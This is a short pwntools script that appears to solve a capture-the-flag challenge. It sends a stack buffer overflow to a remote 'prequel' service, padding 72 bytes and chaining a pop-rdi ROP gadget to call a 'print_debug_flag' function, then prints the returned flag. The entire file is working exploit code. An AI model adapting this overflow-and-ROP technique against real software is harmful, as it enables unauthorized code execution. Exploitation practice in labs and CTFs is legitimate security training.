from pwn import *

context.binary = elf = ELF("./prequel")

p = remote("10.10.5.12", "20882")#process()
"""
g = cyclic_gen()

p.sendline(g.get(100))
p.wait()

print(cyclic_find(p.corefile.fault_addr))
"""
offset = 72
POP_RDI = 0x401FF2

payload = b"A" * 72 # padding
payload += p64(POP_RDI)
payload += p64(1337) # just a number that is greater than 3
payload += p64(elf.sym["print_debug_flag"]) # print_debug_flag's memory address

p.sendline(payload)
p.recvuntil(b"Prepared statement successfully\n")
flag = p.recvuntil(b"}").replace(b"\n", b"").decode() # delete line breaks

log.success("Got flag: " + flag)